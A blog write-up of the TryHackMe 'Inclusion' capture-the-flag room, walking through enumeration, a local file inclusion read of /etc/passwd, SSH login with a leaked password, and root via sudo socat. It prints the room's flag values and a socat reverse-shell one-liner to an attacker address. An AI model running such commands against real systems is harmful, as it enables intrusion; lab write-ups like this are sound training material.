---
title: Inclusion (Try Hack Me)
author: Robin Goyal
date: 2021-09-11 15:45 -0400
categories: [Cybersecurity, Writeups]
tags: [thm, ctf, writeup]
hidden: true
image:
  src: https://tryhackme-images.s3.amazonaws.com/room-icons/dfb60887721c6a62ffa3ae2c35e386e6.png
---

I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.

## Enumeration

Kicking things off with an initial nmap scan of the top 1000 ports, there are two available ports:
- 22 (SSH)
- 80 (HTTP)

![nmap initial](/assets/img/posts/thm-inclusion/nmap-initial.jpg)

I haven't had much experience interacting with a web application hosted by Python so this will be interesting.

From the version information for the SSH, the target is an Ubuntu Linux OS.

### HTTP

Browsing to the web application hosted on port 80, we're presented with a Bootstrap styled landing page.

![landing](/assets/img/posts/thm-inclusion/landing.jpg)

There are not many available sections of the website other than the three columns in the grid at the bottom of the page. Clicking on any of the "View details" options directs us to /article along with a parameter for the name of the article.

![lfiattack](/assets/img/posts/thm-inclusion/lfiattack.jpg)

SO, it is pretty obvious from the name of the room, the title of the article, and the contents of the article that this room is focused on Local File Inclusion (LFI).

## Initial Foothold

### Local File Inclusion

The first file we can try to access is the /etc/passwd file as it is world readable. We can get an idea of the various users available on the system so we could brute force the SSH service.

If the web application is running as root, then we might also be able to view the /etc/shadow file and then use John the Ripper to brute force the root hash or other non-root user hashes.

![shadow error](/assets/img/posts/thm-inclusion/passwd-error.jpg)

LFI takes a bit of trial and error as we need to find where the web application is being served from. Usually, the web applications files begin at /var/www/html so if we move up three levels in the directory structure, we'll be at the root of the filesystem.

![shadow lfi](/assets/img/posts/thm-inclusion/passwd-lfi.jpg)

We were correct! So we have access to the /etc/passwd contents but this is a jumbled mess! If we view the page source, we should have a structured response.

![shadow lfi source](/assets/img/posts/thm-inclusion/passwd-lfi-source.jpg)

Fantastic! However, it looks like the password for one of the users is leaked in the passwd file as a comment! Looks like we won't have to do any potential brute force cracking using John the Ripper.

![initial foothold](/assets/img/posts/thm-inclusion/initial-foothold.jpg)

With the SSH service open, we obtained our initial foothold as the user falconfeast.

![user flag](/assets/img/posts/thm-inclusion/user-flag.jpg)

Grabbing the user flag and we can perform some privilege escalation.

User Flag: `60989655118397345799`

## Privilege Escalation

Let's list out the privileges of the falconfeast user!

![sudo privileges](/assets/img/posts/thm-inclusion/sudo-privs.jpg)

The user, falconfeast, can execute socat as root with no required password. Socat is a similar program to netcat where we can generate a reverse shell to our attacker system [^gtfobins].

![reverse shell](/assets/img/posts/thm-inclusion/reverse-shell.jpg)

Woot! We obtained root and we can complete the room with the root flag.

![root flag](/assets/img/posts/thm-inclusion/root-flag.jpg)

Root Flag: `42964104845495153909`

## Reflection

This room was meant more as an educational role rather than a semi-challenging LFI room. The killchain to obtaining root took a minimal number of steps but this room provided the opportunity to learn about LFI and using socat to generate a reverse shell.

## Useful Commands

### Socat Reverse Shell

`socat tcp-connect:10.6.5.103:4444 exec:/bin/sh,pty,stderr,setsid,sigint,sane`

## References

[^gtfobins]: <https://gtfobins.github.io/gtfobins/socat/#reverse-shell>
